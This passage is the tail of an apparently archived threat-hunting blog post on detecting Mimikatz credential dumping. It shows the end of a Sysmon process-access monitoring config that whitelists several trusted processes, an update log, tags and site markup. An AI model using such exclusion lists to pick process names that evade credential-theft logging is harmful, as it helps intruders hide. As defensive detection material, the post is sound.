+	<span class="nt">&lt;SourceImage</span> <span class="na">condition=</span><span class="s">"end with"</span><span class="nt">&gt;</span>vmtoolsd.exe<span class="nt">&lt;/SourceImage&gt;</span>
+	<span class="nt">&lt;SourceImage</span> <span class="na">condition=</span><span class="s">"end with"</span><span class="nt">&gt;</span>taskmgr.exe<span class="nt">&lt;/SourceImage&gt;</span>
+	<span class="nt">&lt;SourceImage</span> <span class="na">condition=</span><span class="s">"end with"</span><span class="nt">&gt;</span>\Citrix\System32\wfshell.exe<span class="nt">&lt;/SourceImage&gt;</span> #Citrix process in C:\Program Files (x86)\Citrix\System32\wfshell.exe
+	<span class="nt">&lt;SourceImage</span> <span class="na">condition=</span><span class="s">"is"</span><span class="nt">&gt;</span>C:\Windows\System32\lsm.exe<span class="nt">&lt;/SourceImage&gt;</span> # System process under C:\Windows\System32\lsm.exe
+	<span class="nt">&lt;SourceImage</span> <span class="na">condition=</span><span class="s">"end with"</span><span class="nt">&gt;</span>Microsoft.Identity.AadConnect.Health.AadSync.Host.exe<span class="nt">&lt;/SourceImage&gt;</span> # Microsoft Azure AD Connect Health Sync Agent
+	<span class="nt">&lt;SourceImage</span> <span class="na">condition=</span><span class="s">"begin with"</span><span class="nt">&gt;</span>C:\Program Files (x86)\Symantec\Symantec Endpoint Protection<span class="nt">&lt;/SourceImage&gt;</span> # Symantec
+<span class="nt">&lt;/ProcessAccess&gt;</span></code></pre></figure>
+
+<h2 id="updates">Updates</h2>
+<ul>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>13/09/2017</td>
+          <td>added details about test OS &amp; powershell expression used for in-memory execution. Added Detection Artifact III.</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>18/09/2017</td>
+          <td>added sysmon config snip</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ul>
+
+      </article>
+
+      
+        <div class="blog-tags">
+          Tags:
+          
+            threat hunting, hunting, mimikatz, siem, ioc, credential dump, splunk, elk, darkquasar, volatility
+          
+        </div>
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id="social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+  <!--- Share on Twitter -->
+    <a href="https://twitter.com/intent/tweet?text=Tales+of+a+Threat+Hunter+1+https://eideon.com/2017-09-09-THL01-Mimikatz/" class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fa fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+  <!--- Share on Facebook -->
+    <a href="https://www.facebook.com/sharer/sharer.php?u=https://eideon.com/2017-09-09-THL01-Mimikatz/" class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fa fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+
+  
+  <!--- Share on LinkedIn -->
+    <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://eideon.com/2017-09-09-THL01-Mimikatz/" class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fa fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pager blog-pager">
+        
+        
+        <li class="next">
+          <a href="/2017-10-15-THL02-Events_Threats_Incidents/" data-toggle="tooltip" data-placement="top" title="SOC Operational Concepts">Next Post →</a>
+        </li>
+        
+      </ul>
+
+      
+        <div class="disqus-comments">
+          
+
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+    <footer>
+  <div class="container beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+		  
+          <li>
+            <a href="https://twitter.com/darkquassar" title="Twitter">
+              <span class="fa-stack fa-lg" aria-hidden="true">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+              </span>
+              <span class="sr-only">Twitter</span>
+            </a>
+          </li>
+          
+	  
+      
+		  
+          <li>
+            <a href="mailto:darkquasar7@gmail.com" title="Email me">
+              <span class="fa-stack fa-lg" aria-hidden="true">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+              </span>
+              <span class="sr-only">Email me</span>
+            </a>
+          </li>
+          
+		  
+		  
+		  
+      
+      
+      
+      
+      
+		  
+          <li>
+            <a href="/feed.xml" title="RSS">
+              <span class="fa-stack fa-lg" aria-hidden="true">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+              <span class="sr-only">RSS</span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="copyright text-muted">
+		  Diego Perez
+		  &nbsp;•&nbsp;
+		  2022
+
+		  
+		  &nbsp;•&nbsp;
+		  <a href="https://eideon.com">eideon.com</a>
+		  
+	    </p>
+	        <!-- Please don't remove this, keep my open source work credited :) -->
+		<p class="theme-by text-muted">
+		  Theme by
+		  <a href="http://deanattali.com/beautiful-jekyll/">beautiful-jekyll</a>
+		</p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+  
+    
+
+
+
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script>
+      	if (typeof jQuery == 'undefined') {
+      	  document.write('<script src="/js/jquery-1.11.2.min.js"></scr' + 'ipt>');
+      	}
+      </script><script src="/js/jquery-1.11.2.min.js"></script>
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+	<script src="/js/bootstrap.min.js"></script>
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+	<script src="/js/main.js"></script>
+    
+  
+
+
+
+	<!-- Google Analytics -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+		ga('create', 'UA-106202121-1', 'auto');
+		ga('send', 'pageview');
+	</script>
+	<!-- End Google Analytics -->
+
+
+  
+  
+
+<ins class="adsbygoogle adsbygoogle-noablate" style="display: none !important;" data-adsbygoogle-status="done" data-ad-status="unfilled"><div id="aswift_0_host" style="border: medium; height: 0px; width: 0px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"><iframe id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://pagead2.googlesyndication.com/pagead/ads?ltd_cs=1&amp;client=ca-pub-7968060656468551&amp;output=html&amp;adk=1812271804&amp;adf=3025194257&amp;abgtt=6&amp;lmt=1657949981&amp;plat=2%3A16777216%2C3%3A16%2C4%3A16%2C9%3A134250504%2C16%3A8388608%2C17%3A32%2C24%3A32%2C25%3A32%2C30%3A1081344%2C32%3A32%2C41%3A32%2C42%3A32&amp;format=0x0&amp;url=https%3A%2F%2Fwww.eideon.com%2F2017-09-09-THL01-Mimikatz%2F&amp;pra=5&amp;wgl=1&amp;easpi=0&amp;aihb=0&amp;asro=0&amp;ailel=28~30~29~1~2~4~6~7~8~9~10~11~12~13~14~15~16~17~18~19~20~21~24&amp;aiael=28~30~29~1~2~4~6~7~8~9~10~11~12~13~14~15~16~17~18~19~20~21~24&amp;aifxl=28_13~30_23~29_18&amp;aiixl=28_4~30_6~29_5&amp;aslmct=0.7&amp;asamct=0.7&amp;itsi=-1&amp;dt=1718451968178&amp;bpp=18&amp;bdt=1151&amp;idt=256&amp;shv=r20240612&amp;mjsv=m202406110101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;eoidce=1&amp;nras=1&amp;correlator=6033382980281&amp;frm=20&amp;pv=2&amp;ga_vid=386404603.1718451968&amp;ga_sid=1718451969&amp;ga_hid=1552466265&amp;ga_fc=1&amp;u_tz=120&amp;u_his=50&amp;u_h=864&amp;u_w=1536&amp;u_ah=864&amp;u_aw=1536&amp;u_cd=24&amp;u_sd=1.25&amp;adx=-12245933&amp;ady=-12245933&amp;biw=1280&amp;bih=693&amp;scr_x=0&amp;scr_y=0&amp;eid=44759876%2C44759927%2C44759842%2C44795921%2C95329722%2C95332928%2C95334509%2C95334524%2C95334571%2C95334581%2C95334819%2C95335887%2C95334053%2C95335291&amp;oid=2&amp;pvsid=3529530654992535&amp;tmod=57709093&amp;uas=0&amp;nvt=1&amp;fsapi=1&amp;fc=1920&amp;brdim=-25600%2C-25600%2C-25600%2C-25600%2C1536%2C0%2C159%2C27%2C1280%2C692&amp;vis=2&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=32768&amp;bc=31&amp;bz=0.12&amp;ifi=1&amp;uci=a!1&amp;fsb=1&amp;dtd=349" data-google-container-id="a!1" tabindex="0" title="Advertisement" aria-label="Advertisement" data-load-complete="true"></iframe></div></ins><iframe src="https://tpc.googlesyndication.com/sodar/sodar2/225/runner.html" width="0" height="0" style="display: none;"></iframe></body><iframe id="google_esf" name="google_esf" src="https://pagead2.googlesyndication.com/pagead/html/r20240612/r20110914/zrt_lookup_fy2021.html" style="display: none;"></iframe></html>
